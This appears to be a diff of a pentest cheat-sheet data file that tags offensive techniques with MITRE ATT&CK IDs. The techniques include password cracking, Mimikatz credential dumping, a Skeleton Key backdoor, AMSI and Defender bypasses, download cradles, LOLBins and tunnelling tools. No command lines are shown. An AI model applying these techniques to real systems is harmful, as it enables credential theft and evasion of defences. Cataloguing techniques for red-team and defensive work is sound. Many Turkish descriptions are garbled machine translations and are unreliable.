@@ -9105,7 +10661,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Prepend mask pattern kelime listesi entries'e"
+            "desc_tr": "Prepend mask pattern kelime listesi entries'e",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat PRINCE Attack",
@@ -9116,7 +10675,10 @@ module.exports = [
               "tool"
             ],
             "note": "PRINCE combines words from the wordlist in various ways",
-            "desc_tr": "Generate word combinations from wordlist"
+            "desc_tr": "Generate word combinations from wordlist",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat DES Crypt",
@@ -9125,7 +10687,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack DES crypt hashes"
+            "desc_tr": "Crack DES crypt hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat MSSQL (2012+)",
@@ -9134,7 +10699,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack MSSQL 2012/2014 hashes"
+            "desc_tr": "Crack MSSQL 2012/2014 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat MySQL 4.1+",
@@ -9143,7 +10711,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack MySQL SHA1 hashes"
+            "desc_tr": "Crack MySQL SHA1 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat PostgreSQL MD5",
@@ -9152,7 +10723,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack PostgreSQL MD5 hashes"
+            "desc_tr": "Crack PostgreSQL MD5 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat scrypt",
@@ -9162,7 +10736,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Crack scrypt hashes"
+            "desc_tr": "Crack scrypt hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat DPAPI Master Key",
@@ -9172,7 +10749,11 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Crack DPAPI master key files"
+            "desc_tr": "Crack DPAPI master key files",
+            "attack": [
+              "T1110.002",
+              "T1555"
+            ]
           },
           {
             "title": "Hashcat Increment Mode",
@@ -9181,7 +10762,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Try tüm lengths mmax üzerinden'e içinde"
+            "desc_tr": "Try tüm lengths mmax üzerinden'e içinde",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Hybrid",
@@ -9190,7 +10774,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "kelime listesi + mask append"
+            "desc_tr": "kelime listesi + mask append",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Combinator",
@@ -9199,7 +10786,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "İki kelime listesini birleştir"
+            "desc_tr": "İki kelime listesini birleştir",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Optimized",
@@ -9208,7 +10798,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Optimize edilmiş çekirdeği kullan"
+            "desc_tr": "Optimize edilmiş çekirdeği kullan",
+            "attack": [
+              "T1110.002"
+            ]
           }
         ],
         "name_tr": "Offline Cracking (Hashcat)"
@@ -9224,7 +10817,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack hashes with default wordlist"
+            "desc_tr": "Crack hashes with default wordlist",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John with Format",
@@ -9234,7 +10830,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack with specified hash format"
+            "desc_tr": "Crack with specified hash format",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John NTLM",
@@ -9244,7 +10843,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack NTLM hashes"
+            "desc_tr": "Crack NTLM hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John Show Cracked",
@@ -9254,7 +10856,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kırılmış parolaları göster"
+            "desc_tr": "Kırılmış parolaları göster",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John with Rules",
@@ -9263,7 +10868,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack with mangling rules"
+            "desc_tr": "Crack with mangling rules",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "ssh2john Extract Hash",
@@ -9273,7 +10881,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Extract hash from SSH private key"
+            "desc_tr": "Extract hash from SSH private key",
+            "attack": [
+              "T1110.002",
+              "T1552.001"
+            ]
           },
           {
             "title": "zip2john Extract Hash",
@@ -9283,7 +10895,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Extract hash from password-protected ZIP"
+            "desc_tr": "Extract hash from password-protected ZIP",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "zip2john + John Full Workflow",
@@ -9298,7 +10913,10 @@ module.exports = [
               "tool"
             ],
             "note": "john --show displays cracked passwords after the run",
-            "desc_tr": "Extract ZIP hash and crack with rockyou — complete workflow"
+            "desc_tr": "Extract ZIP hash and crack with rockyou — complete workflow",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "ssh2john Extract SSH Key Hash",
@@ -9308,7 +10926,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Extract hash from passphrase-protected SSH private key"
+            "desc_tr": "Extract hash from passphrase-protected SSH private key",
+            "attack": [
+              "T1110.002",
+              "T1552.001"
+            ]
           },
           {
             "title": "ssh2john + John Full Workflow",
@@ -9322,7 +10944,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack SSH key passphrase with john"
+            "desc_tr": "Crack SSH key passphrase with john",
+            "attack": [
+              "T1110.002",
+              "T1552.001"
+            ]
           },
           {
             "title": "rar2john Extract Hash",
@@ -9404,7 +11030,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Extract Kerberos TGS ticket hash"
+            "desc_tr": "Extract Kerberos TGS ticket hash",
+            "attack": [
+              "T1550.003"
+            ]
           },
           {
             "title": "John SHA512Crypt Format",
@@ -9413,7 +11042,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack Linux SHA512 crypt hashes"
+            "desc_tr": "Crack Linux SHA512 crypt hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John bcrypt Format",
@@ -9422,7 +11054,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "bcrypt hash'lerini kır"
+            "desc_tr": "bcrypt hash'lerini kır",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John Kerberos TGS",
@@ -9432,7 +11067,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack Kerberoasted TGS hashes"
+            "desc_tr": "Crack Kerberoasted TGS hashes",
+            "attack": [
+              "T1558.003",
+              "T1110.002"
+            ]
           },
           {
             "title": "John AS-REP Hash",
@@ -9442,7 +11081,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "AS-REP roasting hash'lerini kır"
+            "desc_tr": "AS-REP roasting hash'lerini kır",
+            "attack": [
+              "T1558.004",
+              "T1110.002"
+            ]
           },
           {
             "title": "John NetNTLMv2",
@@ -9452,7 +11095,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack NetNTLMv2 hashes captured by Responder"
+            "desc_tr": "Crack NetNTLMv2 hashes captured by Responder",
+            "attack": [
+              "T1110.002",
+              "T1557.001"
+            ]
           },
           {
             "title": "John MSSQL Hash",
@@ -9461,7 +11108,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack MSSQL password hashes"
+            "desc_tr": "Crack MSSQL password hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John MySQL Hash",
@@ -9470,7 +11120,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack MySQL password hashes"
+            "desc_tr": "Crack MySQL password hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John List Formats",
@@ -9480,7 +11133,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "List all supported hash formats"
+            "desc_tr": "List all supported hash formats",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "John Incremental Mode",
@@ -9489,7 +11145,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Pure kaba kuvvet saldırısı john ile"
+            "desc_tr": "Pure kaba kuvvet saldırısı john ile",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "wpa2john Extract Hash",
@@ -9544,7 +11203,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Tespit et: hash recommended hashcat/john mode ile"
+            "desc_tr": "Tespit et: hash recommended hashcat/john mode ile",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Name That Hash from File",
@@ -9569,7 +11231,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Dump plaintext passwords from memory"
+            "desc_tr": "Dump plaintext passwords from memory",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Mimikatz SAM Dump",
@@ -9579,7 +11244,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Dump SAM database hashes"
+            "desc_tr": "Dump SAM database hashes",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Mimikatz DCSync",
@@ -9589,7 +11257,12 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Replicate AD extract tüm hashes'e"
+            "desc_tr": "Replicate AD extract tüm hashes'e",
+            "attack": [
+              "T1003.001",
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "Mimikatz DCSync Specific User",
@@ -9599,7 +11272,12 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "DCSync a belirli user's hash"
+            "desc_tr": "DCSync a belirli user's hash",
+            "attack": [
+              "T1003.001",
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "Mimikatz Pass the Hash",
@@ -9609,7 +11287,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Pass-the-Hash saldırısı gerçekleştir"
+            "desc_tr": "Pass-the-Hash saldırısı gerçekleştir",
+            "attack": [
+              "T1003.001",
+              "T1550.002"
+            ]
           },
           {
             "title": "Mimikatz Kerberos Tickets",
@@ -9618,7 +11300,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Dışa aktar: Kerberos tickets memory üzerinden"
+            "desc_tr": "Dışa aktar: Kerberos tickets memory üzerinden",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Mimikatz Golden Ticket",
@@ -9628,7 +11313,12 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Create a Golden Ticket"
+            "desc_tr": "Create a Golden Ticket",
+            "attack": [
+              "T1003.001",
+              "T1558.001",
+              "T1550.003"
+            ]
           },
           {
             "title": "Mimikatz DPAPI Vault",
@@ -9638,7 +11328,11 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Şifreyi çöz: DPAPI-protected kimlik bilgileri"
+            "desc_tr": "Şifreyi çöz: DPAPI-protected kimlik bilgileri",
+            "attack": [
+              "T1003.001",
+              "T1555"
+            ]
           },
           {
             "title": "Secretsdump Remote",
@@ -9648,7 +11342,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Dump secrets from remote host (Impacket)"
+            "desc_tr": "Dump secrets from remote host (Impacket)",
+            "attack": [
+              "T1003"
+            ]
           },
           {
             "title": "Secretsdump with Hash",
@@ -9658,7 +11355,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Dump secrets using NTLM hash (PtH)"
+            "desc_tr": "Dump secrets using NTLM hash (PtH)",
+            "attack": [
+              "T1003",
+              "T1550.002"
+            ]
           },
           {
             "title": "Secretsdump Local SAM",
@@ -9668,7 +11369,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Extract hashes from local SAM/SYSTEM files"
+            "desc_tr": "Extract hashes from local SAM/SYSTEM files",
+            "attack": [
+              "T1003"
+            ]
           },
           {
             "title": "Pypykatz Live Dump",
@@ -9677,7 +11381,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Pythmimikatz — dump live LSASS üzerinden üzerinde"
+            "desc_tr": "Pythmimikatz — dump live LSASS üzerinden üzerinde",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Pypykatz from Dump",
@@ -9686,7 +11393,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "LSASS dump dosyasını ayrıştır"
+            "desc_tr": "LSASS dump dosyasını ayrıştır",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "LaZagne All Modules",
@@ -9695,7 +11405,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Extract credentials from various applications"
+            "desc_tr": "Extract credentials from various applications",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Mimikatz DPAPI",
@@ -9704,7 +11417,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Şifreyi çöz: DPAPI creds"
+            "desc_tr": "Şifreyi çöz: DPAPI creds",
+            "attack": [
+              "T1003.001",
+              "T1555"
+            ]
           },
           {
             "title": "Mimikatz Vault",
@@ -9713,7 +11430,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Dump Vault creds"
+            "desc_tr": "Dump Vault creds",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Mimikatz Skeleton Key",
@@ -9723,7 +11443,11 @@ module.exports = [
               "advanced"
             ],
             "note": "All accounts accept 'mimikatz' as password",
-            "desc_tr": "Install backdoor key"
+            "desc_tr": "Install backdoor key",
+            "attack": [
+              "T1003.001",
+              "T1556"
+            ]
           },
           {
             "title": "Pypykatz Minidump",
@@ -9732,7 +11456,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "LSASS'i çevrimdışı ayrıştır"
+            "desc_tr": "LSASS'i çevrimdışı ayrıştır",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "LaZagne All",
@@ -9741,7 +11468,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract all stored passwords"
+            "desc_tr": "Extract all stored passwords",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Password Policy",
@@ -9770,7 +11500,10 @@ module.exports = [
               "essential"
             ],
             "note": "Requires root or shadow group",
-            "desc_tr": "Read password hashes from shadow file"
+            "desc_tr": "Read password hashes from shadow file",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "Unshadow for John",
@@ -9779,7 +11512,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kırma için passwd ve shadow'u birleştir (unshadow)"
+            "desc_tr": "Kırma için passwd ve shadow'u birleştir (unshadow)",
+            "attack": [
+              "T1003.008",
+              "T1110.002"
+            ]
           },
           {
             "title": "LaZagne Linux",
@@ -9788,7 +11525,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Extract stored credentials on Linux"
+            "desc_tr": "Extract stored credentials on Linux",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Search for Password Files",
@@ -9806,7 +11546,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find readable SSH private keys"
+            "desc_tr": "Find readable SSH private keys",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Check Cached Credentials",
@@ -9819,7 +11562,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Look for cached/stored kimlik bilgileri"
+            "desc_tr": "Look for cached/stored kimlik bilgileri",
+            "attack": [
+              "T1552.001"
+            ]
           }
         ],
         "name_tr": "Credential Dumping (Linux)"
@@ -9835,7 +11581,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Spray password across SMB accounts"
+            "desc_tr": "Spray password across SMB accounts",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "CrackMapExec Spray Multiple Passwords",
@@ -9844,7 +11593,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Spray multiple passwords against users"
+            "desc_tr": "Spray multiple passwords against users",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Kerbrute User Enumeration",
@@ -9854,7 +11606,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Enumerate valid AD users via Kerberos"
+            "desc_tr": "Enumerate valid AD users via Kerberos",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Kerbrute Password Spray",
@@ -9864,7 +11619,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Spray a password via Kerberos pre-auth"
+            "desc_tr": "Spray a password via Kerberos pre-auth",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Spray with Hydra",
@@ -9873,7 +11631,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "parola püskürtme Hydra single password üzerinden ile"
+            "desc_tr": "parola püskürtme Hydra single password üzerinden ile",
+            "attack": [
+              "T1110.001",
+              "T1110.003"
+            ]
           }
         ],
         "name_tr": "Password Spraying"
@@ -10054,7 +11816,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Devre dışı bırak: AMSI reflectiPowerShell üzerinden üzerinde içinde"
+            "desc_tr": "Devre dışı bırak: AMSI reflectiPowerShell üzerinden üzerinde içinde",
+            "attack": [
+              "T1059.001",
+              "T1562.001"
+            ]
           },
           {
             "title": "AMSI Bypass (Patching)",
@@ -10064,7 +11830,10 @@ module.exports = [
               "essential"
             ],
             "note": "Obfuscated to avoid string detection",
-            "desc_tr": "Patch AMSI in memory"
+            "desc_tr": "Patch AMSI in memory",
+            "attack": [
+              "T1562.001"
+            ]
           },
           {
             "title": "AMSI Bypass (Matt Graeber)",
@@ -10073,7 +11842,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Force AMSI initialization failure"
+            "desc_tr": "Force AMSI initialization failure",
+            "attack": [
+              "T1562.001"
+            ]
           },
           {
             "title": "AMSI Bypass (PowerShell Downgrade)",
@@ -10083,7 +11855,11 @@ module.exports = [
               "essential"
             ],
             "note": "Only works if .NET 2.0 is still installed",
-            "desc_tr": "AMSI içermeyen PowerShell v2'yi kullan"
+            "desc_tr": "AMSI içermeyen PowerShell v2'yi kullan",
+            "attack": [
+              "T1059.001",
+              "T1562.001"
+            ]
           },
           {
             "title": "AMSI Bypass (Base64 Concatenation)",
@@ -10092,7 +11868,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Split and concatenate AMSI bypass evade detection'e"
+            "desc_tr": "Split and concatenate AMSI bypass evade detection'e",
+            "attack": [
+              "T1562.001"
+            ]
           }
         ],
         "name_tr": "AMSI Bypass"
@@ -10107,7 +11886,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run script bypassing execution policy"
+            "desc_tr": "Run script bypassing execution policy",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Bypass Execution Policy (Unrestricted)",
@@ -10116,7 +11898,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Set unrestricted execution policy"
+            "desc_tr": "Set unrestricted execution policy",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Bypass via Pipe",
@@ -10125,7 +11910,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass execution policy by piping script"
+            "desc_tr": "Bypass execution policy by piping script",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Bypass via Encoded Command",
@@ -10134,7 +11922,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute base64-encoded PowerShell command"
+            "desc_tr": "Execute base64-encoded PowerShell command",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Bypass via Download Cradle (IEX)",
@@ -10143,7 +11934,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Scripti indir ve bellekte çalıştır"
+            "desc_tr": "Scripti indir ve bellekte çalıştır",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Bypass via Download Cradle (IWR)",
@@ -10152,7 +11946,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Download and invoke using Invoke-WebRequest"
+            "desc_tr": "Download and invoke using Invoke-WebRequest",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Invoke-Obfuscation",
@@ -10163,7 +11960,10 @@ module.exports = [
               "tool"
             ],
             "note": "Interactive menu — choose TOKEN, STRING, or ENCODING obfuscation",
-            "desc_tr": "gizleme/karmaşıklaştırma PowerShell scripts evade detection'e"
+            "desc_tr": "gizleme/karmaşıklaştırma PowerShell scripts evade detection'e",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Constrained Language Check",
@@ -10172,7 +11972,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: if CLM is enabled"
+            "desc_tr": "Kontrol et: if CLM is enabled",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Disable Defender",
@@ -10182,7 +11985,10 @@ module.exports = [
               "essential"
             ],
             "note": "Requires admin",
-            "desc_tr": "Devre dışı bırak: real-time monitoring"
+            "desc_tr": "Devre dışı bırak: real-time monitoring",
+            "attack": [
+              "T1562.001"
+            ]
           },
           {
             "title": "Defender Exclusion",
@@ -10277,7 +12083,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Download files using Windows certutil"
+            "desc_tr": "Download files using Windows certutil",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "Certutil Base64 Decode",
@@ -10295,7 +12104,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute HTA payload via mshta"
+            "desc_tr": "Execute HTA payload via mshta",
+            "attack": [
+              "T1218.005"
+            ]
           },
           {
             "title": "MSHTA Inline VBScript",
@@ -10304,7 +12116,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Execute inline VBScript via mshta"
+            "desc_tr": "Execute inline VBScript via mshta",
+            "attack": [
+              "T1059.001",
+              "T1218.005"
+            ]
           },
           {
             "title": "Rundll32 Execution",
@@ -10313,7 +12129,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute DLL payload via rundll32"
+            "desc_tr": "Execute DLL payload via rundll32",
+            "attack": [
+              "T1218.011"
+            ]
           },
           {
             "title": "Wscript Execution",
@@ -10361,7 +12180,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Host .sct file on attacker with embedded VBScript/JScript",
-            "desc_tr": "Execute COM scriptlet via regsvr32"
+            "desc_tr": "Execute COM scriptlet via regsvr32",
+            "attack": [
+              "T1218.010"
+            ]
           },
           {
             "title": "XSL Script Processing",
@@ -10370,7 +12192,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Execute code via WMIC XSL transform"
+            "desc_tr": "Execute code via WMIC XSL transform",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Disable Windows Defender (Admin)",
@@ -10380,7 +12205,11 @@ module.exports = [
               "essential"
             ],
             "note": "Requires local admin privileges",
-            "desc_tr": "Devre dışı bırak: real-time protectiif admüzerinde içinde"
+            "desc_tr": "Devre dışı bırak: real-time protectiif admüzerinde içinde",
+            "attack": [
+              "T1059.001",
+              "T1562.001"
+            ]
           },
           {
             "title": "Add Defender Exclusion Path",
@@ -10390,7 +12219,10 @@ module.exports = [
               "essential"
             ],
             "note": "Requires local admin privileges",
-            "desc_tr": "Add exclusion to avoid scanning payload directory"
+            "desc_tr": "Add exclusion to avoid scanning payload directory",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Add Defender Exclusion Process",
@@ -10399,7 +12231,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Exclude a process Defender tarama üzerinden"
+            "desc_tr": "Exclude a process Defender tarama üzerinden",
+            "attack": [
+              "T1059.001"
+            ]
           }
         ],
         "name_tr": "Binary Obfuscation"
@@ -10414,7 +12249,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute HTA payload"
+            "desc_tr": "Execute HTA payload",
+            "attack": [
+              "T1218.005"
+            ]
           },
           {
             "title": "LOL regsvr32",
@@ -10423,7 +12261,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute SCT file"
+            "desc_tr": "Execute SCT file",
+            "attack": [
+              "T1218.010"
+            ]
           },
           {
             "title": "LOL cmstp",
@@ -10441,7 +12282,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Execute via forfiles"
+            "desc_tr": "Execute via forfiles",
+            "attack": [
+              "T1059.003"
+            ]
           },
           {
             "title": "LOL msiexec",
@@ -10459,7 +12303,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Execute via WSL"
+            "desc_tr": "Execute via WSL",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "Living Off The Land (LOLBins)"
@@ -10485,7 +12332,11 @@ module.exports = [
               "essential"
             ],
             "note": "Access remote service at localhost:<LOCAL_PORT>",
-            "desc_tr": "Forward local port to remote service through SSH"
+            "desc_tr": "Forward local port to remote service through SSH",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Remote Port Forward",
@@ -10494,7 +12345,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Expose attacker service internal network'e"
+            "desc_tr": "Expose attacker service internal network'e",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Dynamic SOCKS Proxy",
@@ -10504,7 +12359,11 @@ module.exports = [
               "essential"
             ],
             "note": "Configure proxychains to use socks5 127.0.0.1 1080",
-            "desc_tr": "Create SOCKS proxy through SSH tunnel"
+            "desc_tr": "Create SOCKS proxy through SSH tunnel",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Jump Host",
@@ -10559,7 +12418,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SSH tunnel key kimlik doğrulama kullanarak"
+            "desc_tr": "SSH tunnel key kimlik doğrulama kullanarak",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "SSH Multi-Hop Jump",
@@ -10577,7 +12439,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Background SOCKS vekil sunucu (proxy)"
+            "desc_tr": "Background SOCKS vekil sunucu (proxy)",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Autossh Persistent",
@@ -10611,7 +12477,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Start chisel server on attacker machine"
+            "desc_tr": "Start chisel server on attacker machine",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel SOCKS Proxy (Client)",
@@ -10622,7 +12492,11 @@ module.exports = [
               "tool"
             ],
             "note": "Creates SOCKS5 proxy on attacker at 127.0.0.1:1080",
-            "desc_tr": "Create reverse SOCKS proxy from target"
+            "desc_tr": "Create reverse SOCKS proxy from target",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Reverse Port Forward",
@@ -10632,7 +12506,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Forward specific port back to attacker"
+            "desc_tr": "Forward specific port back to attacker",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Forward Port",
@@ -10641,7 +12519,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Yerel portu uzak servise yönlendir"
+            "desc_tr": "Yerel portu uzak servise yönlendir",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Multiple Tunnels",
@@ -10651,7 +12533,11 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Create multiple tunnels in single connection"
+            "desc_tr": "Create multiple tunnels in single connection",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "Chisel Tunnels"
@@ -10670,7 +12556,12 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Create TUN interface on attacker (Linux)"
+            "desc_tr": "Create TUN interface on attacker (Linux)",
+            "attack": [
+              "T1033",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Start Proxy",
@@ -10680,7 +12571,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Start ligolo-ng proxy on attacker"
+            "desc_tr": "Start ligolo-ng proxy on attacker",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Agent Connect",
@@ -10690,7 +12585,11 @@ module.exports = [
               "essential",
               "tool"
